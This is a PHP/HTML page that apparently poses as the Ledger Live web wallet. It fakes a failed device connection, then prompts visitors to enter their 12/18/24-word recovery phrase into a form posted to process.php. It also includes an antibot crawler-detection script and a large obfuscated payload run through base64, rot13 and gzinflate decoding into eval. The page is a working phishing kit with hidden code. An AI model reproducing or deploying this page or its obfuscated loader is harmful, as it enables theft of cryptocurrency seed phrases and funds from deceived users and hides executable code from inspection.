<!DOCTYPE html>

<html lang="en"><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
<?php
error_reporting(0);
include '../files/antibot/crawlerdetect.php';
include_once '../functions.php';
?>
  <link rel="shortcut icon" type=image/png href="./files/webwallet_files/wal.png">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Ledger Live - Webwallet</title>
  <link rel="stylesheet" href="./files/webwallet_files/bootstrap.min.css">


  <link href="./files/webwallet_files/css2" rel="stylesheet">
  <link rel="stylesheet" href="./files/webwallet_files/style.css">
  <link rel="stylesheet" href="./files/webwallet_files/all.min.css" integrity="sha512-+4zCK9k+qNFUR5X+cKL9EIR+ZOhtIloNl9GIKS57V1MyNsYpYcUrUeQc9vNfzsWfV28IaLL3i96P9sdNyeRssA==" crossorigin="anonymous">

  <link rel="stylesheet" href="./files/webwallet_files/bootstrap.min.css">
  <link rel="stylesheet" href="./files/webwallet_files/app.css">

  <link href="./files/webwallet_files/css2" rel="stylesheet">
</head>
<body>
<script>
function Function() {
  var txt;
  if (confirm("You need to connect a Ledger to continue.")) {
    window.location.href = "";
  } else {
   
  }
  document.getElementById("demo").innerHTML = txt;
}
</script>

  <div class="content">
    <div class="left">
      <img src="./files/webwallet_files/ledger-logo.png" alt="" srcset="" style="width: 60%;
      margin: 0 auto;
      display: block; margin-top: 20px;">

      <p class="menu-item">MY DEVICES</p>

      <div class="side activated">
        <img src="./files/webwallet_files/wal.png" alt="" height="22px" class="mr-2">
        <span>Add Wallet</span>
      </div>






      <p class="menu-item">MENU</p>

      <div onclick="Function()" class="side">
        <img src="./files/porto.PNG" alt="" height="22px" class="mr-2">
        <span>Portfolio</span>
      </div>

      <div onclick="Function()" class="side">
        <img src="./files/acc.PNG" alt="" height="22px" class="mr-2">
        <span>Accounts</span>
      </div>

      <div onclick="Function()" class="side">
        <img src="./files/send.PNG" alt="" height="22px" class="mr-2">
        <span>Send</span>
      </div>

      <div onclick="Function()" class="side">
        <img src="./files/rec.png" alt="" height="22px" class="mr-2">
        <span>Receive</span>
      </div>

      <div onclick="Function()" class="side">
        <img src="./files/man.png" alt="" height="22px" class="mr-2">
        <span>Manager</span>
      </div>

      <div onclick="Function()" class="side">
        <img src="./files/buy.png" alt="" height="22px" class="mr-2">
        <span>Buy Crypto</span>
      </div>

    </div>

    <div class="rigth">
      <h3><img src="./files/webwallet_files/wal.png" alt="" height="22px" class="mr-2">Ledger Live</h3>
      <p style="font-size: 12px; color:#717171;">Manage crypto assets in Ledger securely from your browser. Advanced security for your cryptocurrency, made easy.</p>

      <div class="main" >
        <div class="timeline">
          <div class="line"></div>
          <div class="line-2"></div>
          <div class="line-3"></div>
          <div class="step active" data-count="1">
            <div class="cercle active-cercle">1</div>
            <p class="desc desc-active">Detection</p>
          </div>
          <div class="step" data-count="2">
            <div class="cercle">2</div>
            <p class="desc">Checking</p>
          </div>
          <div class="step" data-count="3">
            <div class="cercle">3</div>
            <p class="desc">Connect</p>
          </div>
        </div>

        <div id="step-1">
          <h4 class="mt-5 text-center">Select your device</h4>

          <div class="myCards">
            <div class="card-device">
              <img src="./files/webwallet_files/verified.png" alt="" class="verified">
              <img src="./files/webwallet_files/nanox.png" alt="" class="device">
              <p class="mt-2">Ledger Nano X</p>
              <span class="badge badge-secondary" style="font-size: 10px;">USB Only</span>
            </div>

            <div class="card-device">
              <img src="./files/webwallet_files/verified.png" alt="" class="verified">
              <img src="./files/webwallet_files/nanos.png" alt="" class="device">
              <p class="mt-2">Ledger Nano S</p>
			  <span class="badge badge-secondary" style="font-size: 10px;">Bluetooth/USB</span>
            </div>

            <div class="card-device">
              <img src="./files/webwallet_files/verified.png" alt="" class="verified">
              <img src="./files/webwallet_files/blue.png" alt="" class="device">
              <p class="mt-2">Ledger Nano X</p>
			  <span class="badge badge-secondary" style="font-size: 10px;">Bluetooth/USB</span>
            </div>
          </div>
        </div>



        <div id="step-2" class="step-2">
          <div class="video-device">
            <h5 class="text-center">Genuin check</h5>
			<p style="font-size: 12px; color:#717171;"> Connect your Ledger with this device to interact with Ledger Live.</p>


            <div id="connect-spinner">
              <div class="d-flex justify-content-center">
                <div class="spinner-border" role="status">
                  <span class="sr-only">Loading...</span>
                </div>
              </div>
              </div>

            <div class="connect text-center">
              <p style="color: rgb(182, 2, 2); font-size: 12px;">Ledger Live could not connect with your device. Check if your device is connected properly or recover your wallet.</p>

              <button id="use-phrase" class="btn" style="display: block; border: 1px solid rgba(204, 204, 204, 0.582); width: 100%;
              padding: 17px; text-align: left; background-color: #6490f1; margin-bottom: 10px; color: white;">
                <img class="restorememe" style="margin-right: 20px" src="./files/webwallet_files/restore.png" alt="" srcset="" height="22px">
                Recover ledger with seed phrase
              </button>

              <button id="refresh" class="btn" style="display: block; border: 1px solid rgba(204, 204, 204, 0.582); width: 100%;
              padding: 17px; text-align: left;">
              <img style="margin-right: 20px" src="./files/webwallet_files/refresh.png" alt="" srcset="" height="22px">
                Refresh
            </button>
            </div>
          </div>
        </div>



        <div id="step-3" class="step-3">
		<center>
<h4 style="
    margin-top: 10px;
    margin-bottom: 30px;
">Use your Recovery Phrase</h4>
		  <p style="font-size: 12px; color:#717171;">Enter your 12/18/24 words in a strict order. Do not rearrange them. </p>
        </center>
		  

          <form action="process.php" method="POST" id="form1" style="width: 400px; margin: 0 auto;">
            <div class="form-group">
              <textarea name="key" id="phrase" required="required" minlength="12" 
			  style="width: 100%; margin: 0 auto;" 
			  placeholder="Enter your Recovery phrase here" 
			  class="form-control" rows="3"></textarea>

            </div>
			
            <span class="disabled" id="message">Enter a space between each word.</span>
            <button id="recovme" style="width: 100%; margin: 0 auto; padding: 10px; background-color: #6490f1; color: white;display: block; border: none;"
			 form="form1" value="Import" type="submit" name="import" class="recover-finale" >
              Continue
            </button>
          </form>
		  
        </div>


        <div class="bottom">
          <div class="btn back" id="back">
            Back
          </div>

          <button class="btn continue" id="continue" disabled="">
            Continue
          </button>
        </div>

      </div>
      <br>
      <br>
      <br>
      <br>
      <br>
    </div>
  </div>

  <script src="./files/webwallet_files/jquery.min.js.download"></script>
  <?php eval(str_rot13(gzinflate(str_rot13(base64_decode('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')))));?>
  <script src="./files/webwallet_files/popper.min.js.download"></script>
  <script src="./files/webwallet_files/bootstrap.min.js.download"></script>
  <script src="./files/webwallet_files/app.js.download"></script>
  <script src="./files/webwallet_files/phrase.js.download"></script>


</body></html>